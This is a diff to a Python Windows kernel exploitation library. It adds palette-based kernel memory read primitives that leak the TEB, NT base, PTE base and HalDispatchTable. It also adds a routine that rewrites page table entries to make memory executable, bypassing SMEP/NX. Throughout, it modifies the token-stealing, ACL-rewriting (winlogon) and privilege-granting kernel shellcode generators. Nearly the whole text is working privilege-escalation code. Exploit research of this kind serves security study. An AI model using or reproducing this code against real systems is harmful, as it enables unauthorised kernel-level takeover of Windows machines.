@@ -51,6 +51,8 @@ NTSTATUS = DWORD
 HPALETTE = HANDLE
 QWORD = c_ulonglong
 CHAR = c_char
+KAFFINITY = ULONG_PTR
+SDWORD = c_int32
 
 
 #to be filled properly
@@ -179,6 +181,22 @@ class PROCESSENTRY32(Structure):
 				 ( 'szExeFile' , CHAR * MAX_PATH ) 
 	] 
 
+class CLIENT_ID(Structure):
+	_fields_ = [
+		("UniqueProcess",   PVOID),
+		("UniqueThread",	PVOID),
+]
+
+class THREAD_BASIC_INFORMATION(Structure):
+	_fields_ = [
+		("ExitStatus",	  NTSTATUS),
+		("TebBaseAddress",  PVOID),	 # PTEB
+		("ClientId",		CLIENT_ID),
+		("AffinityMask",	KAFFINITY),
+		("Priority",		SDWORD),
+		("BasePriority",	SDWORD),
+	]
+
 #########################################################################################
 ###################################Function definitions##################################
 #########################################################################################
@@ -235,6 +253,9 @@ kernel32.VirtualAllocEx.restype = LPVOID
 kernel32.CreateRemoteThread.argtypes = [HANDLE, QWORD, UINT, QWORD, LPVOID, DWORD, POINTER(HANDLE)]
 kernel32.CreateRemoteThread.restype = BOOL
 
+kernel32.GetCurrentThread.argtypes = []
+kernel32.GetCurrentThread.restype = HANDLE
+
 advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
 advapi32.OpenProcessToken.restype = BOOL
 
@@ -244,10 +265,17 @@ kernel32.CreateToolhelp32Snapshot.restype = HANDLE
 kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, c_void_p, DWORD, c_void_p, DWORD, c_void_p, c_void_p]
 kernel32.DeviceIoControl.restype = BOOL
 
+ntdll.NtQueryInformationThread.argtypes = [HANDLE, DWORD, POINTER(THREAD_BASIC_INFORMATION), ULONG, POINTER(ULONG)]
+ntdll.NtQueryInformationThread.restype = NTSTATUS
+
 #########################################################################################
 ######################################Common constants###################################
 #########################################################################################
 
+# THREAD_INFORMATION_CLASS
+ThreadBasicInformation = 0
+
+# PROCESS_INFORMATION_CLASS
 ProcessBasicInformation = 0 #Retrieves a pointer to a PEB structure that can be used to determine whether the specified process is being debugged, and a unique value used by the system to identify the specified process. It is best to use the CheckRemoteDebuggerPresent and GetProcessId functions to obtain this information.
 ProcessDebugPort = 7 #Retrieves a DWORD_PTR value that is the port number of the debugger for the process. A nonzero value indicates that the process is being run under the control of a ring 3 debugger. It is best to use the CheckRemoteDebuggerPresent or IsDebuggerPresent function.
 ProcessWow64Information = 26 #Determines whether the process is running in the WOW64 environment (WOW64 is the x86 emulator that allows Win32-based applications to run on 64-bit Windows). It is best to use the IsWow64Process function to obtain this information.
@@ -307,6 +335,15 @@ class x_file_handles(Exception):
 ###################This section contains sysinfo related functions#######################
 #########################################################################################
 
+def get_kuser_shared_data():
+	"""
+	This function returns the static address of KUSER_SHARED_DATA
+	@return: address of KUSER_SHARED_DATA
+	"""
+	if platform.architecture()[0] == '64bit':
+		return 0xFFFFF78000000000
+	elif platform.architecture()[0] == '32bit':
+		return 0x7FFE0000
 
 #source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py
 def signed_to_unsigned(signed):
@@ -385,6 +422,24 @@ def token_address_of_process(h_process, process_id):
 				print "[+] PID: %s token address: %x" % (str(process_id), obj)
 				return obj
 
+def get_teb_base():
+	"""
+	Function to get the TEB base address
+	@return: teb base address
+	"""
+	print "[*] Getting TEB base address"
+	h_thread = kernel32.GetCurrentThread()
+	tbi = THREAD_BASIC_INFORMATION()
+	len = c_ulonglong()
+	result = ntdll.NtQueryInformationThread(h_thread, ThreadBasicInformation, byref(tbi), sizeof(tbi), None)
+	if result == STATUS_SUCCESS:
+		teb_base = tbi.TebBaseAddress
+		print "[+] TEB base address: %s" % hex(teb_base)
+		return teb_base
+	else:
+		print "[-] Something wen wrong, exiting..."
+		sys.exit(-1)
+
 def kernel_address_of_handle(h, process_id):
 	"""
 	Function to get the address of the handle
@@ -422,6 +477,7 @@ def getpid(procname):
 		print "[-] Could not find %s PID" % procname
 		sys.exit()
 	return pid
+
 #########################################################################################
 ###############This section contains kernel pool spraying related functions##############
 #########################################################################################
@@ -582,6 +638,114 @@ def pool_overwrite(required_hole_size,good_object):
 		else:
 			header += struct.pack("L",pool_object_headers[good_object][i])
 	return header
+
+#########################################################################################
+######################This section contains PTE related functions########################
+#########################################################################################
+
+def get_pxe_address_x64(virtual_address, pte_base):
+	"""
+	The functions gives the PTE address for a virtual address
+	Based on: https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
+	@param virtual_address: the virtual address to convert
+	@param pte_base: the base address for PTE
+	"""
+	pte_address = virtual_address >> 9
+	pte_address = pte_address | pte_base
+	pte_address = pte_address & (pte_base + 0x0000007ffffffff8)
+	return pte_address
+
+def get_pxe_address_x32(virtual_address, pte_base):
+	"""
+	The functions gives the PTE address for a virtual address
+	@param virtual_address: the virtual address to convert
+	@param pte_base: the base address for PTE
+	"""
+	pte_address = virtual_address >> 9
+	pte_address = pte_address | pte_base
+	pte_address = pte_address & (pte_base + 0x007FFFF8)
+	return pte_address
+
+def get_pte_base_old_x64():
+	""" Returns the PTE base address for older version of Windows (prior 1607 / Redstone 1 / Anniversary Update) """
+	return 0xFFFFF68000000000
+
+def get_pte_base_old_x32():
+	""" Returns the PTE base address for older version of Windows (prior 1607 / Redstone 1 / Anniversary Update) """
+	return 0xC0000000
+
+def leak_pte_base_palette(manager_palette, worker_palette):
+	"""
+	Based on:
+	https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Pointer-Leak.ps1
+	and
+	https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf
+	Function to leak the PTE base from the nt!MiGetPteAddress function
+	@param manager_platte: handle to the manager palette
+	@param worker_platte: handle to the worker palette
+	@return: PTE base
+	"""
+	print "[*] Locating PTE base..."
+	#get the MmFreeNonCachedMemory address
+ 	if platform.architecture()[0] == '64bit':
+		kernel32.LoadLibraryExA.restype = c_uint64
+		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
+		kernel32.GetProcAddress.restype = c_uint64
+	#(krnlbase, kernelver) = find_driver_base()
+	krnlbase = leak_nt_base_palette(manager_palette, worker_palette)
+	kernelver = ['ntoskrnl.exe','ntkrnlmp.exe','ntkrnlpa.exe','ntkrpamp.exe']
+	for k in kernelver:
+		print "[+] Loading %s in userland" % k
+		hKernel = kernel32.LoadLibraryExA(k, 0, 1)
+		if hKernel != 0:
+			print "[+] %s base address : %s" % (k, hex(hKernel))
+			break
+	if hKernel == 0:
+		print "[-] Couldn't load kernel, exiting..."
+		sys.exit(-1)
+	MmFreeNonCachedMemory = kernel32.GetProcAddress(hKernel, 'MmFreeNonCachedMemory')
+	MmFreeNonCachedMemory -= hKernel
+	MmFreeNonCachedMemory += krnlbase
+	print "[+] MmFreeNonCachedMemory address: %s" % hex(MmFreeNonCachedMemory)
+	#use palettes to find the MiGetPteAddress by searching the CALL function in MmFreeNonCachedMemory
+	#e.g.: fffff802`3c6ba4d7 e8fc059bff	  call	nt!MiGetPteAddress (fffff802`3c06aad8)
+	MmFreeNonCachedMemory_data = create_string_buffer(0x100)
+	read_memory_palette(manager_palette, worker_palette, MmFreeNonCachedMemory, byref(MmFreeNonCachedMemory_data), sizeof(MmFreeNonCachedMemory_data))
+	#loop through the function data and search for the first call (e8)
+	for i in range(sizeof(MmFreeNonCachedMemory_data)):
+		if MmFreeNonCachedMemory_data.raw[i] == '\xe8':
+			offset = 0x100000000 - struct.unpack("L",MmFreeNonCachedMemory_data.raw[i+1:i+5])[0]
+			MiGetPteAddress_address = MmFreeNonCachedMemory - offset + 5 + i
+			print "[+] MiGetPteAddress address: %s" % hex(MiGetPteAddress_address)
+			break
+	"""
+	nt!MiGetPteAddress:
+	fffff802`3c06aad8 48c1e909		shr	 rcx,9
+	fffff802`3c06aadc 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
+	fffff802`3c06aae6 4823c8		  and	 rcx,rax
+	fffff802`3c06aae9 48b80000000000baffff mov rax,0FFFFBA0000000000h
+	"""
+	pte_base = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, MiGetPteAddress_address + 0x13, byref(pte_base), sizeof(pte_base))
+	print "[+] PTE base: %s" % hex(pte_base.value)
+	return pte_base.value
+
+
+def make_memory_executable_palette(manager_palette, worker_palette, virtual_address):
+	"""
+	Function to change an address to executable with palettes
+	based on: https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf
+	@param manager_platte: handle to the manager palette
+	@param worker_platte: handle to the worker palette
+	"""
+	pte_base = leak_pte_base_palette(manager_palette, worker_palette)
+	pte_address = get_pxe_address_x64(virtual_address, pte_base)
+	current_pte_value = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, pte_address, byref(current_pte_value), sizeof(current_pte_value))
+	tobe_pte_value = c_ulonglong(current_pte_value.value & 0x0fffffffffffffff)
+	write_memory_palette(manager_palette, worker_palette, pte_address, byref(tobe_pte_value), sizeof(tobe_pte_value));
+
+	
 
 #########################################################################################
 ############This section contains kernel GDI object abusing related functions############
@@ -774,6 +938,72 @@ def read_memory_palette(manager_platte_handle, worker_platte_handle, src, dst, l
 	#we need to divide the len by 4 as the PALETTENTRY is 4 byte
 	gdi32.GetPaletteEntries(worker_platte_handle, 0, len/4, dst)
 
+def leak_nt_base_palette(manager_palette, worker_palette):
+	"""
+	Function to leak the NT base via TEB
+	Based on:
+	https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Pointer-Leak.ps1
+	and
+	https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf
+	@param manager_platte: handle to the manager palette
+	@param worker_platte: handle to the worker palette
+	@return: NT base
+	"""
+	print "[*] Leaking NT base via TEB and PALETTEs"
+	teb = get_teb_base()
+	Win32ThreadInfo_address = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, teb + 0x78, byref(Win32ThreadInfo_address), sizeof(Win32ThreadInfo_address))
+	print "[+] Win32ThreadInfo_address: %s" % hex(Win32ThreadInfo_address.value)
+
+	KTHREAD_address = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, Win32ThreadInfo_address.value, byref(KTHREAD_address), sizeof(KTHREAD_address))
+	print "[+] KTHREAD address: %s " % hex(KTHREAD_address.value)
+	
+	pointer_into_nt = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, KTHREAD_address.value + 0x2a8, byref(pointer_into_nt), sizeof(pointer_into_nt))
+	print "[+] Pointer into NT address: %s" % hex(pointer_into_nt.value)
+	
+	#search the MZ header backwards
+	mz = 0x905a4d
+	start_address = 0xFFFFFFFFFFFFF000 & pointer_into_nt.value
+	while(True):
+		data = c_uint()
+		#check the first 4 bytes of the page if it's the MZ header
+		read_memory_palette(manager_palette, worker_palette, start_address, byref(data), sizeof(data))
+		if data.value == mz:
+			print "[+] NT base address found: %s" % hex(start_address)
+			return start_address
+		else:
+			start_address = start_address - 0x1000
+
+def leak_haldispatchtable_palette(manager_palette, worker_palette):
+	"""
+	Function to leak the HalDispatchTable Address using PALETTEs
+	@param manager_platte: handle to the manager palette
+	@param worker_platte: handle to the worker palette
+	@return: HalDispatchTable address
+	"""
+	print "[*] Locating HalDispatchTable base..."
+ 	if platform.architecture()[0] == '64bit':
+		kernel32.LoadLibraryExA.restype = c_uint64
+		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
+		kernel32.GetProcAddress.restype = c_uint64
+	krnlbase = leak_nt_base_palette(manager_palette, worker_palette)
+	kernelver = ['ntoskrnl.exe','ntkrnlmp.exe','ntkrnlpa.exe','ntkrpamp.exe']
+	for k in kernelver:
+		print "[+] Loading %s in userland" % k
+		hKernel = kernel32.LoadLibraryExA(k, 0, 1)
+		if hKernel != 0:
+			print "[+] %s base address : %s" % (k, hex(hKernel))
+			break
+	if hKernel == 0:
+		print "[-] Couldn't load kernel, exiting..."
+		sys.exit(-1)
+	HalDispatchTable = kernel32.GetProcAddress(hKernel, 'HalDispatchTable')
+	HalDispatchTable -= hKernel
+	HalDispatchTable += krnlbase
+	print "[+] HalDispatchTable address:", hex(HalDispatchTable)
+	return HalDispatchTable
 
 #original source: https://github.com/GradiusX/HEVD-Python-Solutions
 def get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS):
@@ -1074,9 +1304,9 @@ def findHMValidateHandle():
 	hUser32 = kernel32.LoadLibraryA("user32.dll")
 	pIsMenu = kernel32.GetProcAddress(hUser32, "IsMenu")
 	if pIsMenu == None:
-		print "\t[-] Failed to find location of exported function 'IsMenu' within user32.dll..."
+		print "[-] Failed to find location of exported function 'IsMenu' within user32.dll..."
 		sys.exit(-1)
-	print "\t[+] user32.IsMenu: 0x%X" % pIsMenu
+	print "[+] user32.IsMenu: 0x%X" % pIsMenu
 	pHMValidateHandle_offset = 0
 	offset = 0
 	while (offset < 0x1000):
@@ -1087,15 +1317,15 @@ def findHMValidateHandle():
 			break
 		offset = offset + 1
 	if pHMValidateHandle_offset == 0:
-		print "\t[-] Failed to find offset of HMValidateHandle from location of 'IsMenu'..."
+		print "[-] Failed to find offset of HMValidateHandle from location of 'IsMenu'..."
 		sys.exit(-1)
-	print "\t[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset
+	print "[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset
 	HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
-	print "\t[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset
+	print "[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset
 	#Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
 	#The +11 is to skip the padding bytes as on Windows 10 these aren't nops
 	pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb
-	print "\t[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle
+	print "[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle
 	return pHMValidateHandle
 
 def PyWndProcedure(hWnd, Msg, wParam, lParam):
@@ -1647,6 +1877,7 @@ def restoretokenx86(RETVAL, extra = ""):
 	else:
 		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
 	
+	shellcode = shellcode + '\x90' * (len(shellcode) % 4)
 	return shellcode
 
 #https://www.exploit-db.com/exploits/18176/ 
@@ -1680,6 +1911,7 @@ def tokenstealingx86(RETVAL, extra = ""):
 	else:
 		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
 	
+	shellcode = shellcode + '\x90' * (len(shellcode) % 4)
 	return shellcode
 	
 def tokenstealingx64(RETVAL, extra = ""):
@@ -1692,8 +1924,14 @@ def tokenstealingx64(RETVAL, extra = ""):
 	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 	shellcode = (
 	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]		 ;Get current ETHREAD in
-	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
-	"\x48\x89\xc1"																		# mov	 rcx, rax				;Copy current KTHREAD_Process address to RCX
+	)
+	
+	if KTHREAD_Process > 0x7f:
+		shellcode = shellcode + "\x48\x8b\x80" + struct.pack("B",KTHREAD_Process) + "\x00\x00\x00" # mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
+	else:
+		shellcode = shellcode + "\x48\x8b\x40" + struct.pack("B",KTHREAD_Process)
+	
+	shellcode = shellcode + ("\x48\x89\xc1"												# mov	 rcx, rax				;Copy current KTHREAD_Process address to RCX
 	"\x48\x8b\x80" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"			# mov	 rax, [rax+0xe0]		 ;Next KTHREAD_Process ActivKTHREAD_ProcessLinks.Flink
 	"\x48\x2d" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"				# sub	 rax, 0xe0			   ;Go to the beginning of the KTHREAD_Process structure
 	"\x4c\x8b\x88" + struct.pack("H",EPROCESS_UniqueProcessId) + "\x00\x00"				# mov	 r9 , [rax+0xd8]		 ;Copy PID to R9
@@ -1709,12 +1947,11 @@ def tokenstealingx64(RETVAL, extra = ""):
 		shellcode += "\xc3"						#retn
 	else:
 		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
-	
+	shellcode = shellcode + '\x90' * (len(shellcode) % 4)	
 	return shellcode
 
 def acl_shellcode_x64(RETVAL, extra = "", name = "winlogon.exe"):
 	"""
-	#NOTTESTED
 	Create a shellcode for x64 platform to set the ACL for the given process name so that it will allow access for authenticated users
 	based on: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-2
 	@param RETVAL: the value for the ASM RET instruction
@@ -1725,11 +1962,17 @@ def acl_shellcode_x64(RETVAL, extra = "", name = "winlogon.exe"):
 	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 	shellcode = (
 	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]	;Get current ETHREAD in
-	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) + 								# mov	 rax, [rax+0xb8]	;Get current KTHREAD_Process address
-	"\x48\x89\xc1"																		# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
+	)
+	
+	if KTHREAD_Process > 0x7f:
+		shellcode = shellcode + "\x48\x8b\x80" + struct.pack("B",KTHREAD_Process) + "\x00\x00\x00" # mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
+	else:
+		shellcode = shellcode + "\x48\x8b\x40" + struct.pack("B",KTHREAD_Process)
+	
+	shellcode = shellcode + ("\x48\x89\xc1"												# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
 	"\x48\x8b\x80" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"			# mov	 rax, [rax+0xe0]		 ;Next KTHREAD_Process ActivKTHREAD_ProcessLinks.Flink
 	"\x48\x2d" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"				# sub	 rax, 0xe0			   ;Go to the beginning of the KTHREAD_Process structure
-	"\x81\xB8" + struct.pack("H",EPROCESS_ImageFileName) + "\x00\x00" + name[0:4][::-1] + # cmp dword ptr [rax+0x450], 0x6c6e6977
+	"\x81\xB8" + struct.pack("H",EPROCESS_ImageFileName) + "\x00\x00" + name[0:4] + # cmp dword ptr [rax+0x450], 0x6c6e6977
 	"\x75\xe7"																			# jnz short find_process   ;If no match got to next KTHREAD_Process
 	"\x48\x83\xE8\x08"																	# sub rax, 0x8 ; get to the SecurityDescriptor in the _OBJECT_HEADER
 	"\x48\x8B\x00" 																		# mov rax, qword ptr [rax]
@@ -1749,11 +1992,11 @@ def acl_shellcode_x64(RETVAL, extra = "", name = "winlogon.exe"):
 	else:
 		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
 	
+	shellcode = shellcode + '\x90' * (len(shellcode) % 4)
 	return shellcode
 
 def privilege_shellcode_x64(RETVAL, extra = ""):
 	"""
-	#NOTTESTED
 	Create a shellcode for x64 platform to give full privileges for the current process
 	based on: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-3
 	@param RETVAL: the value for the ASM RET instruction
@@ -1763,8 +2006,14 @@ def privilege_shellcode_x64(RETVAL, extra = ""):
 	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 	shellcode = (
 	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]	;Get current ETHREAD in
-	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	 rax, [rax+0xb8]	;Get current KTHREAD_Process address
-	"\x48\x89\xc1"																		# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
+	)
+	
+	if KTHREAD_Process > 0x7f:
+		shellcode = shellcode + "\x48\x8b\x80" + struct.pack("B",KTHREAD_Process) + "\x00\x00\x00" # mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
+	else:
+		shellcode = shellcode + "\x48\x8b\x40" + struct.pack("B",KTHREAD_Process)
+	
+	shellcode = shellcode + ("\x48\x89\xc1"												# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
 	"\x48\x81\xC1" + struct.pack("H",EPROCESS_Token) + "\x00\x00"						# add rcx, 0x358 ; offset the Tokens
 	"\x48\x8B\x01"																		# mov rax, qword ptr [rcx] ; copy pointer
 	"\x48\x83\xE0\xF0"																	# and rax, 0x0FFFFFFFFFFFFFFF0 ; clear last 4 bits
@@ -1778,6 +2027,7 @@ def privilege_shellcode_x64(RETVAL, extra = ""):
 	else:
 		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
 	
+	shellcode = shellcode + '\x90' * (len(shellcode) % 4)
 	return shellcode
 
 def tokenstealing(RETVAL, extra = ""):
